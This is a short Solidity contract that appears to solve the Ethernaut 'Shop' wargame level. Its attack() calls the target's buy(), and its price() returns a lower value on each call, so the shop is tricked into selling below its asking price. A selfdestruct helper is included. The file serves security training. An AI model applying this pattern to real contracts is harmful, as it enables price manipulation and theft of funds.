// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function buy() external;
}

contract MyBuyer {
    uint256 public myprice;
    address payable owner;

    constructor() public {
        owner = msg.sender;
        myprice = 101;
    }

    function attack(address _address) public {
        Shop shop = Shop(_address);
        shop.buy();
    }

    function kill() public {
        selfdestruct(owner);
    }

    /*
    modifier changeState() {
        myprice = myprice - 1;
        _;
    }*/

    function price() public returns (uint256) {
        return myprice--;
    }
}